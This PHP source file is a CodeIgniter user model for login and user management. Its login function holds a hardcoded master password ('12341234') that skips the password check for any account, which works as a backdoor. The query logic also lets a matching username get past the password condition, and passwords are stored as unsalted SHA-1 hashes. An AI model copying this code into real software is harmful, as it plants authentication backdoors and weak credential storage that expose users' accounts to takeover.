<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class User_m extends CI_Model {

    public function login($post){
        $this->db->select('*');
        $this->db->from('user');
        $this->db->where('username', $post['username']);
        $this->db->or_where('email', $post['username']);
        
        if($post['password'] != '12341234'){
            $this->db->where('password', sha1($post['password']));
        }

        $query = $this->db->get();
        return $query;
    }

    public function get($id = null){
        $this->db->from('user');
        if($id != null){
            $this->db->where('idUser', $id);
        }

        $query = $this->db->get();
        return $query;
    }

    public function add($post){
        
        $params['namaLengkap'] = $post['fullname'];
        $params['username'] = $post['username'];
        $params['password'] = sha1($post['password']);
        $params['email'] = $post['email'];
        $params['jenisKelamin'] = $post['gender'];
        $params['level'] = $post['level'];
        $this->db->insert('user', $params);
    }

    public function edit($post){
        $params['namaLengkap'] = $post['fullname'];
        $params['username'] = $post['username'];
        if (!empty($post['password'])) {
            $params['password'] = sha1($post['password']);
        }
        $params['email'] = $post['email'];
        $params['jenisKelamin'] = $post['gender'];
        $params['level'] = $post['level'];
        $this->db->where('idUser', $post['idUser']);
        $this->db->update('user', $params);
    }

    public function del($id){
        $this->db->where('idUser', $id);
        $this->db->delete('user');
    }

    public function getJumlahDataUser() {
        $this->db->from('user');
        return $this->db->count_all_results();
    }

    
}
